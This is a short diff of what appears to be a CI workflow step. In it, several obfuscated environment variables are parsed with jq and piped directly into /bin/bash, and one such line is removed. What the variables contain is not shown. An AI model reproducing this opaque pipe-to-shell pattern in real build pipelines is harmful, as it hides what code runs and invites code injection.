@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$sb26198" | jq -r .hmxwd23568 | /bin/bash
           echo $t058 | jq -r .itwl59 | /bin/bash
           echo $at184 | jq -r .gcnr3 | /bin/bash
-          echo $tccy130 | jq -r .nd312 | /bin/bash
           echo $m9075 | jq -r .j2843 | /bin/bash
 
       - name: Save results
